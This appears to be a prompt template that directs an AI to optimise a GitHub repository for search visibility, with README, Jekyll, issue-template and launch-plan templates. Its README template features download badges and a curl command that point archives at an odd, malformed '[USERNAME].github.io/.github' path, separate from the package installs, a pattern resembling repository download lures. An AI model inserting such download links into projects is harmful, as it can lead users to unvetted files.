# Universal GitHub SEO Optimization Prompt

## 🎯 Task Overview

You are a **GitHub SEO & DevRel Specialist**. Your job is to completely optimize a GitHub repository for maximum search engine visibility, discoverability, and community engagement. Transform the repository into a professional, SEO-optimized project that ranks high in search results and attracts contributors.

## 📋 Project Context

**Repository**: [REPOSITORY_NAME]
**Project Type**: [PROJECT_TYPE] (e.g., library, framework, application, tool, game, dataset, etc.)
**Topic/Industry**: [PROJECT_TOPIC] (e.g., gaming, crypto, AI, web development, mobile, CLI, data science, etc.)
**Target Audience**: [TARGET_USERS] (e.g., developers, gamers, traders, researchers, students, etc.)
**Main Keywords**: [PRIMARY_KEYWORDS] (e.g., "game engine", "portfolio tracker", "AI tool", "data visualization")
**Programming Language(s)**: [LANGUAGES] (e.g., JavaScript, Python, Rust, Go, etc.)
**Platform(s)**: [PLATFORMS] (e.g., web, mobile, desktop, cli, cloud, embedded, etc.)

## 🔧 Required Deliverables

### 1. Repository Structure Optimization

Create/optimize these essential files:

#### Core Files
- `README.md` - Comprehensive project overview with badges, features, screenshots
- `LICENSE` - Appropriate license (MIT, Apache 2.0, GPL, BSD, etc.)
- `CONTRIBUTING.md` - Detailed contribution guidelines
- `SECURITY.md` - Security policy and vulnerability reporting
- `CHANGELOG.md` - Version history following semantic versioning
- `.gitignore` - Comprehensive ignore rules for the project type
- `CODE_OF_CONDUCT.md` - Community standards (optional but recommended)

#### GitHub-Specific Files
- `.github/ISSUE_TEMPLATE/bug_report.md` - Bug report template
- `.github/ISSUE_TEMPLATE/feature_request.md` - Feature request template
- `.github/ISSUE_TEMPLATE/question.md` - Question template
- `.github/PULL_REQUEST_TEMPLATE.md` - Pull request template
- `.github/FUNDING.yml` - Sponsorship information (if applicable)
- `.github/workflows/` - CI/CD workflows (if applicable)

#### Documentation
- `docs/index.md` - Main documentation page for GitHub Pages
- `docs/_config.yml` - Jekyll configuration with SEO plugins
- `docs/sitemap.xml` - SEO sitemap for better indexing
- `docs/getting-started.md` - Quick start guide
- `docs/api-reference.md` - API documentation (if applicable)
- `docs/examples/` - Code examples and tutorials

### 2. GitHub Repository Settings

Configure via GitHub API or manual settings:

#### Basic Information
- **Description**: Compelling 1-2 sentence description with main keywords and emojis (max 350 chars)
- **Homepage URL**: Link to GitHub Pages, documentation site, or demo
- **Topics**: 15-20 relevant tags for discoverability

#### Features to Enable
- GitHub Pages (source: `/docs` folder)
- GitHub Discussions
- Issues with templates
- Releases
- Wiki (optional, based on project complexity)
- Sponsorships (if monetization is planned)
- Projects (for roadmap visualization)

#### SEO Topics Template
Choose 15-20 from these categories based on project:

**Technology Stack**:
- Languages: `javascript`, `python`, `rust`, `go`, `java`, `cpp`, `csharp`
- Frameworks: `react`, `vue`, `angular`, `django`, `fastapi`, `spring`
- Runtime: `nodejs`, `deno`, `dotnet`, `jvm`

**Platform/Target**:
- `web`, `mobile`, `desktop`, `cli`, `api`, `cloud`, `serverless`
- `cross-platform`, `native`, `pwa`, `electron`

**Industry/Domain**:
- `gaming`, `finance`, `healthcare`, `education`, `ecommerce`
- `ai`, `machine-learning`, `data-science`, `blockchain`, `iot`

**Project Type**:
- `library`, `framework`, `tool`, `app`, `plugin`, `extension`
- `sdk`, `api-client`, `boilerplate`, `starter-kit`

**Features/Characteristics**:
- `open-source`, `real-time`, `offline-first`, `privacy-focused`
- `performance`, `scalable`, `secure`, `lightweight`

**Audience**:
- `developers`, `beginners`, `enterprise`, `students`
- `researchers`, `data-scientists`, `designers`

### 3. Content Optimization

#### README.md Structure
```markdown
# [Project Name] — [Compelling Tagline]

[Badges: License, Stars, Version, Build Status, Coverage, Downloads, etc.]

> **[Key value proposition in 1-2 sentences that includes main keywords]**

[Optional: Eye-catching demo GIF or screenshot]

## 🚀 Quick Start

### 📥 Download
[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://[USERNAME].github.io/.github)

```bash
# Or via command line
curl -L https://[USERNAME].github.io/.github[ARCHIVE-NAME].zip -o [PROJECT-NAME].zip
```

### 📦 Installation
```bash
# Installation command
npm install [package-name]
# or
pip install [package-name]
# or
cargo add [package-name]
```

### 🔥 Basic Usage
```javascript
// Minimal working example
import { feature } from '[package-name]';

const result = feature();
console.log(result);
```

## ✨ Features

- 🎯 **[Feature 1]**: [Description with keywords]
- ⚡ **[Feature 2]**: [Description with benefits]
- 🔒 **[Feature 3]**: [Description with use cases]
- 🌍 **[Feature 4]**: [Description with platforms]
- 📊 **[Feature 5]**: [Description with performance]

## 📸 Screenshots/Demo

[Include 3-5 high-quality images, GIFs, or embedded videos]
[For web apps: Include live demo link]
[For CLI tools: Include asciinema recordings]
[For libraries: Include code playground links]

## 📥 Download Options

### Latest Release
<div align="center">
  
[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D4?style=for-the-badge&logo=windows)](https://[USERNAME].github.io/.github[PROJECT]-win.zip)
[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple)](https://[USERNAME].github.io/.github[PROJECT]-mac.zip)
[![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://[USERNAME].github.io/.github[PROJECT]-linux.tar.gz)

</div>

### Package Managers
```bash
# NPM
npm install [package-name]

# Yarn
yarn add [package-name]

# PNPM
pnpm add [package-name]
```

### From Source
```bash
git clone https://github.com/[username]/[repo-name]
cd [repo-name]
[build commands]
```

## 📚 Documentation

- 📖 **[Getting Started](docs/getting-started.md)** - Installation and first steps
- 🔧 **[Configuration](docs/configuration.md)** - All configuration options
- 📚 **[API Reference](docs/api-reference.md)** - Complete API documentation
- 💡 **[Examples](docs/examples/)** - Sample projects and use cases
- 🎯 **[Best Practices](docs/best-practices.md)** - Tips and recommendations
- ❓ **[FAQ](docs/faq.md)** - Frequently asked questions

## 🤝 Contributing

We love your input! We want to make contributing as easy and transparent as possible. Please see our [Contributing Guidelines](CONTRIBUTING.md).

### Ways to Contribute
- 🐛 Report bugs
- 💡 Suggest new features
- 📝 Improve documentation
- 🔧 Submit pull requests

## 🗺️ Roadmap

- [ ] [v1.1] Feature A - [Description]
- [ ] [v1.2] Feature B - [Description]
- [ ] [v2.0] Major Enhancement - [Description]

See the [open issues](https://github.com/[username]/[repo]/issues) for a full list of proposed features.

## 📄 License

This project is licensed under the [LICENSE_TYPE] License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- [Credit key contributors]
- [Mention inspirations or forks]
- [Thank sponsors if any]

## 🔗 Links

- 🏠 **[Website/Demo](https://[project-url])**
- 📚 **[Documentation](https://[username].github.io/[repo])**
- 💬 **[Discord/Slack](https://[chat-url])**
- 🐦 **[Twitter](https://twitter.com/[handle])**

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=[username]/[repo]&type=Date)](https://star-history.com/#[username]/[repo]&Date)

---

<p align="center">
  Made with ❤️ by [Your Name/Organization]
</p>
```

#### SEO Keywords Integration Strategy

**Natural Placement**:
- Repository name should include primary keyword
- Description must contain 2-3 keywords naturally
- README headings should incorporate keywords
- File and folder names should be keyword-rich
- Documentation titles should target long-tail keywords

**Avoid Over-optimization**:
- No keyword stuffing
- Natural language flow
- Focus on user value
- Semantic variations

### 4. GitHub Pages Setup

#### Jekyll Configuration (`docs/_config.yml`)
```yaml
# Site settings
title: [Project Name] - [Tagline with Keywords]
description: [SEO-optimized description with keywords, max 160 chars]
baseurl: "/[repository-name]"
url: "https://[username].github.io"
repository: [username]/[repository-name]

# SEO and Social
author:
  name: [Author/Organization]
  url: https://github.com/[username]

twitter:
  username: [twitter_handle]
  card: summary_large_image

social:
  name: [Project Name]
  links:
    - https://github.com/[username]/[repository-name]
    - https://twitter.com/[twitter_handle]

# Theme and plugins
theme: just-the-docs # or minima, minimal-mistakes, etc.
plugins:
  - jekyll-feed
  - jekyll-sitemap
  - jekyll-seo-tag
  - jekyll-redirect-from
  - jekyll-github-metadata

# Google Analytics (optional)
google_analytics: [GA_TRACKING_ID]

# Search
search_enabled: true
search:
  heading_level: 2
  previews: 3

# Navigation
nav_enabled: true
nav_sort: case_insensitive

# Footer
footer_content: "Copyright &copy; 2025 [Your Name]. Distributed by an [LICENSE] license."

# Color scheme
color_scheme: light # or dark, or custom
```

#### Structured Data (Schema.org)
Add to documentation pages:
```html
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "SoftwareSourceCode",
  "name": "[Project Name]",
  "description": "[Description]",
  "url": "https://github.com/[username]/[repo]",
  "codeRepository": "https://github.com/[username]/[repo]",
  "programmingLanguage": "[Language]",
  "license": "https://github.com/[username]/[repo]/blob/main/LICENSE",
  "author": {
    "@type": "Person",
    "name": "[Author Name]",
    "url": "https://github.com/[username]"
  }
}
</script>
```

### 5. Release Strategy

#### Versioning Strategy
- Follow Semantic Versioning (SemVer)
- Tag format: `v1.0.0`
- Pre-releases: `v1.0.0-beta.1`

#### First Release (v1.0.0)
```markdown
# [Project Name] v1.0.0 - [Catchy Release Title]

We're excited to announce the first stable release of [Project Name]! 🎉

## ✨ Highlights

- 🚀 **[Major Feature 1]** - [Description]
- 🎯 **[Major Feature 2]** - [Description]
- ⚡ **[Major Feature 3]** - [Description]

## 📦 Installation

```bash
[Installation commands for different package managers]
```

## 🚀 Quick Start

```[language]
[Minimal code example]
```

## 📚 Documentation

- [Getting Started Guide]([link])
- [API Reference]([link])
- [Examples]([link])

## 🙏 Acknowledgments

Special thanks to all contributors who made this release possible!

## 📊 Stats

- X commits
- Y contributors
- Z closed issues

---

**Full Changelog**: https://github.com/[username]/[repo]/commits/v1.0.0
```

### 6. Community Building

#### Issue Templates

**Bug Report** (`.github/ISSUE_TEMPLATE/bug_report.md`):
```yaml
---
name: Bug Report
about: Create a report to help us improve
title: '[BUG] '
labels: 'bug, needs-triage'
assignees: ''
---

## Description
[Clear description of the bug]

## To Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Expected Behavior
[What should happen]

## Actual Behavior
[What actually happens]

## Environment
- OS: [e.g., Windows 11, macOS 13, Ubuntu 22.04]
- [Project] Version: [e.g., 1.0.0]
- [Language] Version: [e.g., Node 18, Python 3.11]

## Additional Context
[Any other relevant information]
```

**Feature Request** (`.github/ISSUE_TEMPLATE/feature_request.md`):
```yaml
---
name: Feature Request
about: Suggest an idea for this project
title: '[FEATURE] '
labels: 'enhancement, needs-triage'
assignees: ''
---

## Problem Statement
[Description of the problem this feature would solve]

## Proposed Solution
[Your idea for solving the problem]

## Alternatives Considered
[Other solutions you've thought about]

## Additional Context
[Use cases, examples, or mockups]
```

#### Contributing Guidelines
Key sections to include:
- Development setup
- Code style guidelines
- Testing requirements
- Pull request process
- Code of conduct
- Recognition/credits

#### Security Policy
Include:
- Supported versions table
- How to report vulnerabilities
- Response timeline
- Disclosure policy

## 📊 SEO Optimization Checklist

### Pre-Launch
- [ ] Repository name includes primary keyword
- [ ] Description optimized (keywords + emojis)
- [ ] 15-20 relevant topics selected
- [ ] README fully optimized with keywords
- [ ] Documentation site configured
- [ ] Sitemap.xml created
- [ ] First release drafted
- [ ] Social preview image created (1280x640px)
- [ ] Issue templates configured
- [ ] Contributing guidelines written

### Launch Day
- [ ] Repository made public
- [ ] First release published
- [ ] GitHub Pages enabled
- [ ] Discussions enabled
- [ ] Social media announcements prepared
- [ ] Community submissions planned

### Post-Launch
- [ ] Google Search Console verified
- [ ] Analytics configured
- [ ] Backlink building started
- [ ] Content calendar created
- [ ] Community engagement active

## 🎯 Keyword Strategy Framework

### Research Process
1. **Competitor Analysis**: Study similar successful projects
2. **Search Volume**: Use tools to find high-volume keywords
3. **Difficulty Assessment**: Target achievable keywords
4. **User Intent**: Match keywords to user needs

### Keyword Categories

**Branded Keywords**:
- [Project name]
- [Project name] + [language]
- [Project name] + tutorial/guide/docs

**Generic Keywords**:
- [Problem it solves]
- [Main functionality]
- [Technology] + [use case]

**Long-tail Keywords**:
- "how to [specific task] with [technology]"
- "best [tool type] for [use case]"
- "[technology] [problem] solution"

### Placement Strategy
1. **High Priority**: Repository name, description, README title
2. **Medium Priority**: Section headings, first paragraphs
3. **Low Priority**: Body text, code comments, examples

## 🚀 Launch & Promotion Strategy

### Week 1: Foundation
1. **Repository Launch**
   - Make repository public
   - Publish first release
   - Enable all community features
   - Upload social preview

2. **Documentation**
   - Ensure GitHub Pages is live
   - Test all documentation links
   - Verify sitemap accessibility

3. **Initial Promotion**
   - Personal social media
   - Relevant Discord/Slack communities
   - Team/company channels

### Week 2-4: Amplification
1. **Content Marketing**
   - Write launch blog post
   - Create demo video/GIF
   - Prepare comparison articles

2. **Community Outreach**
   - Reddit submissions (choose 3-5 relevant subreddits)
   - Hacker News (Show HN)
   - Dev.to / Hashnode articles
   - Stack Overflow answers (where relevant)

3. **Directory Submissions**
   - Product Hunt
   - GitHub Awesome lists
   - AlternativeTo
   - Industry-specific directories

### Month 2+: Sustained Growth
1. **Content Creation**
   - Weekly blog posts
   - Tutorial videos
   - Case studies
   - User showcases

2. **Community Building**
   - Regular discussions
   - Contributor recognition
   - Virtual meetups
   - Documentation improvements

3. **Partnership Development**
   - Integration partners
   - Sponsor outreach
   - Conference talks
   - Podcast appearances

## 📈 Success Metrics & KPIs

### Repository Metrics
**Month 1 Targets**:
- 50-100 GitHub stars
- 10-20 forks
- 5-10 contributors
- 500-1000 visitors

**Month 3 Targets**:
- 200-500 stars
- 50-100 forks
- 20-30 contributors
- 2000-5000 visitors

**Month 6 Targets**:
- 1000+ stars
- 200+ forks
- 50+ contributors
- 10000+ visitors

### SEO Metrics
- **Search Rankings**: Track position for target keywords
- **Organic Traffic**: Monitor GitHub Pages analytics
- **Backlinks**: Track mentions and links
- **Click-through Rate**: Optimize based on impressions

### Community Metrics
- **Engagement Rate**: Issues, PRs, discussions participation
- **Response Time**: How quickly issues are addressed
- **Contributor Growth**: New contributors per month
- **User Satisfaction**: Feedback and testimonials

## 🛠️ Tools & Resources

### Essential Tools
**SEO & Analytics**:
- Google Search Console
- Google Analytics 4
- Ahrefs/SEMrush (keywords)
- Lighthouse (performance)
- Schema.org validator

**GitHub Enhancement**:
- GitHub CLI
- Probot (automation)
- All Contributors bot
- Dependabot
- CodeQL (security)

**Content Creation**:
- Canva/Figma (graphics)
- Carbon (code screenshots)
- Asciinema (terminal recordings)
- OBS Studio (video tutorials)
- Mermaid (diagrams)

**Community Management**:
- Discord/Slack (community chat)
- Calendly (contributor calls)
- GitHub Discussions
- Twitter/X
- LinkedIn

### Automation Opportunities
- Release automation with GitHub Actions
- Automated dependency updates
- Code quality checks
- Documentation generation
- Social media posting

## ⚠️ Common Pitfalls to Avoid

### SEO Mistakes
- ❌ Keyword stuffing
- ❌ Duplicate content
- ❌ Ignoring meta descriptions
- ❌ Broken links
- ❌ Slow page load times

### Repository Mistakes
- ❌ Unclear project purpose
- ❌ Missing documentation
- ❌ No contribution guidelines
- ❌ Ignoring issues
- ❌ Inconsistent releases

### Community Mistakes
- ❌ Not responding to users
- ❌ Rejecting contributions rudely
- ❌ No code of conduct
- ❌ Lack of recognition
- ❌ Closed development

## 🎯 Final Implementation Checklist

Before considering the project "SEO-ready":

**Repository Setup**:
- [ ] All required files created
- [ ] Repository settings optimized
- [ ] Topics carefully selected
- [ ] Description compelling
- [ ] License appropriate

**Documentation**:
- [ ] README comprehensive
- [ ] GitHub Pages live
- [ ] API docs complete
- [ ] Examples provided
- [ ] Search enabled

**Community**:
- [ ] Templates configured
- [ ] Guidelines clear
- [ ] First release published
- [ ] Discussions enabled
- [ ] Social preview uploaded

**SEO Technical**:
- [ ] Keywords researched
- [ ] Content optimized
- [ ] Sitemap generated
- [ ] Schema markup added
- [ ] Performance optimized

**Launch Preparation**:
- [ ] Promotion plan ready
- [ ] Content calendar created
- [ ] Communities identified
- [ ] Metrics tracking setup
- [ ] Team briefed

---

**Remember**: SEO is a marathon, not a sprint. Focus on creating genuine value for your users, maintaining high-quality documentation, and building an active community. The rankings and stars will follow naturally.

**Ready to launch? Let's make your project discoverable! 🚀** 